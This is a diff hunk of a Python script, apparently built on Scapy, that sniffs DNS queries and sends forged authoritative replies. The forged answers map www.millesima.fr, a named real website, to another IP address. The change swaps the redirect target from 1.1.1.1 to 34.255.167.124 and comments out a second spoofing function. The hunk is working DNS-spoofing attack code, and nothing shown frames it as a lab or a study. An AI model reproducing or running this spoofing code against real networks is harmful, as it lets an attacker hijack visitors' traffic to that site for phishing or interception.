@@ -17,15 +17,15 @@ def dns_reply(pkt):
     spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
         UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
         DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
-        an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='1.1.1.1')) 
+        an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='34.255.167.124')) 
     send(spoofed_pkt)
 
-def dns_crequest(pkt):
-    spoofed_pkt = IP(dst=pkt[IP].dst, src=pkt[IP].src)/\
-        UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport)/\
-        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
-        an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='1.1.1.1'))
-    send(spoofed_pkt)
+# def dns_crequest(pkt):
+#     spoofed_pkt = IP(dst=pkt[IP].dst, src=pkt[IP].src)/\
+#         UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport)/\
+#         DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
+#         an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='1.1.1.1'))
+#     send(spoofed_pkt)
 
 def sniff_DNS(pkt):
     pkt_time = pkt.sprintf('%sent.time%')
